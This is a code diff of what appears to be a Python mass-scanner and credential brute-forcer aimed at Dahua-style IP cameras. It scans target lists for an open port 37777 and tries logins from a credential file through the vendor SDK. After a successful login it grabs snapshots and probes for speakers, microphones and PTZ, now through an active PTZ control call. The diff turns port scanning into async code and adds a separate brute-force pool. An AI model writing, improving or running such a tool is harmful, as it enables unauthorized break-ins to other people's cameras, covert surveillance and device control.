@@ -9,7 +9,8 @@ import socket
 import ctypes
 import platform
 import re
-from concurrent.futures import ThreadPoolExecutor, wait, FIRST_COMPLETED
+import asyncio
+from concurrent.futures import ThreadPoolExecutor
 
 # --- ANSI COLORS ---
 COLORS = {
@@ -180,15 +181,15 @@ def load_sdk():
         _sdk = ctypes.CDLL(p, mode=ctypes.RTLD_GLOBAL)
     return _sdk
 
-def is_port_open(ip, port, timeout=2):
+async def is_port_open_async(ip, port, timeout=1.5):
     try:
-        debug_log(f"Checking {ip}:{port}...")
-        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        conn.settimeout(timeout)
-        result = conn.connect_ex((ip, port))
-        conn.close()
-        return result == 0
-    except: return False
+        conn = asyncio.open_connection(ip, port)
+        _, writer = await asyncio.wait_for(conn, timeout=timeout)
+        writer.close()
+        await writer.wait_closed()
+        return True
+    except:
+        return False
 
 def get_device_info(login_id):
     try:
@@ -206,22 +207,15 @@ def get_device_info(login_id):
             if cfg.byTalkOutChanNum > 0: speaker = True
             if cfg.byTalkInChanNum > 0 or cfg.byAudioCaptureNum > 0: mic = True
         
-        ptz_buf = (ctypes.c_byte * 256)()
-        ptz_ret = ctypes.c_int(0)
-        ptz_res = sdk.CLIENT_QueryDevState(C_LLONG(login_id), QUERY_PTZ_LOCATION, ctypes.cast(ptz_buf, ctypes.c_char_p), 256, ctypes.byref(ptz_ret), 2000)
-        
-        DH_DEV_PTZ_CFG = 0x0040
-        ptz_cfg_buf = (ctypes.c_byte * 4096)()
-        ret_len = ctypes.c_int(0)
-        ptz_cfg_res = sdk.CLIENT_GetDevConfig(C_LLONG(login_id), DH_DEV_PTZ_CFG, -1, ctypes.byref(ptz_cfg_buf), ctypes.sizeof(ptz_cfg_buf), ctypes.byref(ret_len), 3000)
+        ptz_res = sdk.CLIENT_DHPTZControlEx2(C_LLONG(login_id), 0, 0, 0, 0, 0, 1, None)
         
         ptz_heuristic = False
         if model.upper().startswith("SD") or "PTZ" in model.upper() or "DOME" in model.upper():
             ptz_heuristic = True
 
-        ptz = True if (ptz_res or ptz_cfg_res or ptz_heuristic) else False
+        ptz = True if (ptz_res or ptz_heuristic) else False
         
-        debug_log(f"ID {login_id} - Model: {model} | S:{speaker} M:{mic} P:{ptz} (L:{bool(ptz_res)} C:{bool(ptz_cfg_res)} H:{ptz_heuristic})")
+        debug_log(f"ID {login_id} - Model: {model} | S:{speaker} M:{mic} P:{ptz} (Active:{bool(ptz_res)} H:{ptz_heuristic})")
         return model, speaker, mic, ptz
     except Exception as e:
         debug_log(f"Info retrieval failed for ID {login_id}: {e}")
@@ -296,24 +290,17 @@ def attempt_login(ip, port, user, password, output_dir):
         debug_log(f"Error during login attempt for {ip}: {e}")
         return login_ok, False
 
-def process_target(ip, port, credentials, output_dir):
-    if stop_event.is_set(): return False
-    if not is_port_open(ip, port):
-        with stats_lock: stats["scanned"] += 1
-        return False
-    debug_log(f"Port 37777 open on {ip}")
-    success = False
+def brute_worker(ip, port, credentials, output_dir):
+    if stop_event.is_set(): return
     for cred in credentials:
         if stop_event.is_set(): break
         user, password = cred.split(':')
         login_ok, snap_ok = attempt_login(ip, port, user, password, output_dir)
         if login_ok:
             if snap_ok:
-                success = True
                 with stats_lock: stats["found"] += 1
             break
     with stats_lock: stats["scanned"] += 1
-    return success
 
 # --- UI LOGIC ---
 def format_progress(scanned, found, total, width=48):
@@ -395,6 +382,48 @@ def file_target_generator(filename):
             if not line: continue
             yield from parse_targets_generator(line)
 
+async def run_scanner(args, credentials):
+    scan_limit = args.threads // 2
+    brute_limit = args.threads // 2
+    if scan_limit < 1: scan_limit = 1
+    if brute_limit < 1: brute_limit = 1
+    
+    semaphore = asyncio.Semaphore(scan_limit)
+    executor = ThreadPoolExecutor(max_workers=brute_limit)
+    tasks = set(); last_update = 0.0
+    
+    async def scan_task(ip, port):
+        async with semaphore:
+            if stop_event.is_set(): return
+            if await is_port_open_async(ip, port):
+                debug_log(f"Port {port} open on {ip}, sending to brute pool...")
+                executor.submit(brute_worker, ip, port, credentials, args.output)
+            else:
+                with stats_lock: stats["scanned"] += 1
+
+    target_gen = file_target_generator(args.input)
+    
+    try:
+        for ip, port in target_gen:
+            if stop_event.is_set(): break
+            t = asyncio.create_task(scan_task(ip, port))
+            tasks.add(t)
+            t.add_done_callback(tasks.discard)
+            
+            if len(tasks) > scan_limit * 4:
+                await asyncio.sleep(0.01)
+            
+            now = time.time()
+            if now - last_update >= 0.1:
+                print_progress_once(); last_update = now
+        
+        while tasks and not stop_event.is_set():
+            await asyncio.sleep(0.1)
+            print_progress_once()
+            
+    finally:
+        executor.shutdown(wait=False)
+
 def validate_files_fast(args):
     if not os.path.exists(args.input):
         cprint("lightred", f"[!] {args.input} not found!"); return False
@@ -461,35 +490,15 @@ def main():
     with open(args.creds, "r") as f:
         credentials = [l.strip() for l in f if ":" in l]
     
-    running = set(); last_update = 0.0
-    target_gen = file_target_generator(args.input)
-    
-    with ThreadPoolExecutor(max_workers=args.threads) as executor:
-        def submit_next():
-            try:
-                result = next(target_gen)
-                if not result: return False
-                ip, port = result
-                fut = executor.submit(process_target, ip, port, credentials, args.output)
-                running.add(fut); return True
-            except StopIteration: return False
-            except Exception: return True
-        
-        for _ in range(args.threads * 2):
-            if not submit_next(): break
-            
-        while running and not stop_event.is_set():
-            done, _ = wait(running, timeout=0.05, return_when=FIRST_COMPLETED)
-            for fut in done:
-                running.discard(fut)
-                submit_next()
-            now = time.time()
-            if now - last_update >= 0.1 and not interrupted_by_user:
-                print_progress_once(); last_update = now
+    try:
+        asyncio.run(run_scanner(args, credentials))
+    except (KeyboardInterrupt, SystemExit): pass
+    except Exception as e: debug_log(f"Async error: {e}")
                 
     if not interrupted_by_user:
         print_progress_once(); sys.stdout.write('\n')
         cprint("lightgreen", "[+] Scan complete! Stopping...")
     sdk.CLIENT_Cleanup()
+
 if __name__ == "__main__":
     main()
